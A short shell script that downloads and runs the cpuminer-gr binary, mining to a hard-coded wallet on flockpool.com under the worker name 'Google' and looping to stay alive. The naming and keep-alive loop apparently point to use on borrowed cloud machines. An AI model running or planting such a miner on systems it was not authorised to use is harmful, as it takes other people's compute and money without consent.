#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/WyvernTKC/cpuminer-gr-avx2/releases/download/1.2.4.1/cpuminer-gr-1.2.4.1-x86_64_linux.tar.gz
tar xzvf cpuminer-gr-1.2.4.1-x86_64_linux.tar.gz
cd cpuminer-gr-1.2.4.1-x86_64_linux/binaries
./cpuminer-avx -a gr -o stratum+tcps://us.flockpool.com:5555 -u RJwiygAasWSgwDYGUWTYg4c2hWbebSGznQ.Google --no-tune
while [ 1 ]; do
sleep 3
done
sleep 999
